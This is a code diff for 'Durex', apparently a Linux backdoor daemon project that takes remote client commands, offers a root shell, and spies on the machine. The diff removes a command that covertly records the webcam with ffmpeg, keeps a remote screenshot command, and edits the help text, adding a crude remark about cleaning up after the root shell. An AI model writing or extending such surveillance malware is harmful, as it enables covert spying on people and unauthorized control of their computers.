@@ -34,8 +34,7 @@ static t_bool	server_cmd_help(t_client *client, t_server *server)
 		"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
 		"\t'log'\t\t- Print durex log file.\n"
 		"\t'stat'\t\t- Print status and information about durex.\n"
-		"\t'screenshot'\t- Take screenshot of the screen and save it to /tmp folder.\n"
-		"\t'camvid'\t- Record video using webcam and save it to /tmp folder.\n\n"
+		"\t'screenshot'\t- Take screenshot of the screen and save it to /tmp folder.\n\n"
 		COLORIZE(SH_YELLOW, " • Informations:\n")
 		" * You can check install status with 'stat' command.\n"
 		" * You can check service status by running: systemctl status durex in shell.\n"
@@ -46,7 +45,7 @@ static t_bool	server_cmd_help(t_client *client, t_server *server)
 		" systemctl stop durex;\n systemctl disable durex;\n systemtcl daemon-reload;\n"
 		" systemctl reset-failed;\n rm /var/lock/durex.lock;\n"
 		" And finally remove all listed file in Informations sections.\n"
-		" For a full uninstall, you can also remove this packages : ffmpeg, imagemagick-6.q16\n"
+		" Don't forget to clean your shit done with root shell.\n"
 		"\n";
 	if (!server || !client)
 		return (false);
@@ -234,33 +233,6 @@ static t_bool	server_cmd_screenshot(t_client *client, t_server *server)
 	return (true);
 }
 
-static t_bool	server_cmd_camvid(t_client *client, t_server *server)
-{
-	char	*camvid[] =
-		{
-		 	"/usr/bin/ffmpeg",
-			"-f", "v4l2",
-			"-framerate", "25",
-			"-video_size", "640x480",
-			"-t", NAMEOF_CONTENT(VIDEO_RECORD_TIME),
-			"-i", "/dev/video0",
-			"/tmp/camvid_"__TIME__".mkv",
-			"-y",
-			"-timelimit", NAMEOF_CONTENT(VIDEO_RECORD_LIMIT),
-			"-err_detect",
-			"-xerror",
-			NULL,
-		};
-
-	if (!server || !client)
-		return (false);
-	send_text(COLORIZE(SH_RED, "• ")"Recording webcam /dev/video0 ...\n", client->socket);
-	exec_command(camvid, "Capturing webcam ...", NULL, -1);
-	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tVideo record end. Check in /tmp folder.\n", client->socket);
-	send_text("\tIf the command failed, try install ffmpeg using shell.\n", client->socket);
-	return (true);
-}
-
 static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
 {
 	[HELP] = COMMAND(help),
@@ -271,7 +243,6 @@ static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
 	[LOG] = COMMAND(log),
 	[EXIT] = COMMAND(exit),
 	[SCREENSHOT] = COMMAND(screenshot),
-	[CAMVID] = COMMAND(camvid),
 };
 
 void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
